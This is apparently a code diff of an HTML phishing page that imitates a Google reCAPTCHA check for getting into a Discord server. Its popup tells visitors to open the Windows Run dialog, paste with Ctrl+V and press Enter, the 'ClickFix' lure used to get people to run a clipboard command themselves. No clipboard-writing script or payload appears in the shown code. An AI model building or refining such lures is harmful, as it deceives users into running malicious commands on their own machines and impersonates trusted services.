@@ -1,160 +1,178 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Verify to Access Discord</title>
+  <meta charset="UTF-8">
+  <title>Verify To Get ACCESS To Discord Server</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
+      background: #f2f2f2;
       font-family: Arial, sans-serif;
-      background: #f0f0f0;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
     }
 
-    .card {
+    .captcha-box {
+      width: 304px;
+      height: 78px;
       background: #fff;
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
-      text-align: center;
-    }
-
-    .card h2 {
-      margin-bottom: 20px;
-    }
-
-    .recaptcha-box {
+      border: 1px solid #d3d3d3;
+      border-radius: 3px;
       display: flex;
       align-items: center;
-      border: 1px solid #d3d3d3;
-      border-radius: 4px;
-      padding: 15px;
-      width: 300px;
-      margin: 0 auto;
-      background: #f9f9f9;
+      padding: 10px;
+      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
       position: relative;
-    }
-
-    .recaptcha-checkbox {
-      width: 22px;
-      height: 22px;
-      border: 2px solid #c1c1c1;
-      border-radius: 3px;
-      margin-right: 15px;
       cursor: pointer;
+    }
+
+    .checkbox {
+      width: 28px;
+      height: 28px;
+      border: 2px solid #ccc;
+      border-radius: 2px;
+      margin-right: 12px;
       position: relative;
     }
 
-    .recaptcha-checkbox.checked::after {
-      content: "✓";
-      color: #007bff;
-      font-size: 16px;
+    .checkbox.checked::after {
+      content: '';
       position: absolute;
-      top: 0;
-      left: 4px;
+      top: 3px;
+      left: 8px;
+      width: 8px;
+      height: 14px;
+      border: solid #000;
+      border-width: 0 3px 3px 0;
+      transform: rotate(45deg);
     }
 
-    .recaptcha-label {
+    .captcha-text {
       flex-grow: 1;
-      font-size: 14px;
+      font-size: 16px;
       color: #222;
     }
 
-    .recaptcha-logo {
+    .captcha-logo {
       position: absolute;
       right: 10px;
-      bottom: 5px;
+      bottom: 8px;
       display: flex;
-      flex-direction: column;
       align-items: center;
-      font-size: 9px;
-      color: #666;
+      font-size: 10px;
+      color: #888;
     }
 
-    .recaptcha-logo img {
-      width: 24px;
-      height: 24px;
+    .captcha-logo img {
+      width: 20px;
+      height: 20px;
+      margin-left: 6px;
     }
 
-    .popup {
+    /* Modal */
+    .modal {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.6);
       display: none;
-      margin-top: 25px;
-      background: #ffffff;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+    }
+
+    .modal-content {
+      background: #fff;
+      width: 360px;
       padding: 20px;
-      border-radius: 10px;
-      border: 1px solid #ccc;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-      text-align: left;
-      width: 350px;
+      border-radius: 6px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.2);
     }
 
-    .popup h3 {
-      margin-top: 0;
+    .modal-content h2 {
       color: #007bff;
-    }
-
-    .popup ol {
-      padding-left: 20px;
-    }
-
-    .popup ol li {
       margin-bottom: 10px;
     }
 
-    .popup .box {
-      background: #eaffea;
-      padding: 10px;
-      margin-top: 15px;
-      border-left: 4px solid #33cc33;
-      font-family: monospace;
+    .modal-content ol {
+      padding-left: 20px;
+      margin-bottom: 15px;
     }
 
-    a {
-      color: #666;
-      text-decoration: none;
+    .modal-content ol li {
+      margin-bottom: 10px;
+    }
+
+    .modal-content strong {
+      font-weight: bold;
+    }
+
+    .green-check {
+      color: green;
+      font-size: 12px;
+    }
+
+    .verify-btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 8px 20px;
+      font-size: 14px;
+      border-radius: 4px;
+      cursor: pointer;
+      float: right;
+    }
+
+    .close-btn {
+      float: right;
+      font-size: 20px;
+      font-weight: bold;
+      cursor: pointer;
+      color: #aaa;
+    }
+
+    .close-btn:hover {
+      color: #000;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Verify to access my Discord server</h2>
 
-    <div class="recaptcha-box" onclick="toggleCheck()">
-      <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
-      <div class="recaptcha-label">I'm not a robot</div>
-      <div class="recaptcha-logo">
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-        <div><a href="#">Privacy</a> · <a href="#">Terms</a></div>
-      </div>
-    </div>
-
-    <div class="popup" id="stepPopup">
-      <h3>Complete these Verification Steps</h3>
-      <ol>
-        <li>Press & hold the Windows Key <strong>⊞</strong> + <strong>R</strong></li>
-        <li>In the verification window, press <strong>Ctrl + V</strong></li>
-        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
-      </ol>
-      <div class="box">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</div>
-    </div>
+<div class="captcha-box" onclick="openModal()">
+  <div class="checkbox" id="checkbox"></div>
+  <div class="captcha-text">I'm not a robot</div>
+  <div class="captcha-logo">
+    reCAPTCHA
+    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
   </div>
+</div>
 
-  <script>
-    function toggleCheck() {
-      const checkbox = document.getElementById("recaptchaCheckbox");
-      const popup = document.getElementById("stepPopup");
+<div class="modal" id="captchaModal">
+  <div class="modal-content">
+    <span class="close-btn" onclick="closeModal()">&times;</span>
+    <h2>Complete these <strong>Verification Steps</strong></h2>
+    <p>To better prove you are not a robot, please:</p>
+    <ol>
+      <li><strong>Press & hold</strong> the Windows Key <kbd>⊞</kbd> + <kbd>R</kbd></li>
+      <li>In the verification window, press <strong>Ctrl + V</strong></li>
+      <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
+    </ol>
+    <p class="green-check">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</p>
+    <button class="verify-btn" onclick="closeModal()">VERIFY</button>
+  </div>
+</div>
 
-      checkbox.classList.toggle("checked");
-      if (checkbox.classList.contains("checked")) {
-        popup.style.display = "block";
-      } else {
-        popup.style.display = "none";
-      }
-    }
-  </script>
+<script>
+  function openModal() {
+    document.getElementById('captchaModal').style.display = 'flex';
+    document.getElementById('checkbox').classList.add('checked');
+  }
+
+  function closeModal() {
+    document.getElementById('captchaModal').style.display = 'none';
+  }
+</script>
+
 </body>
 </html>
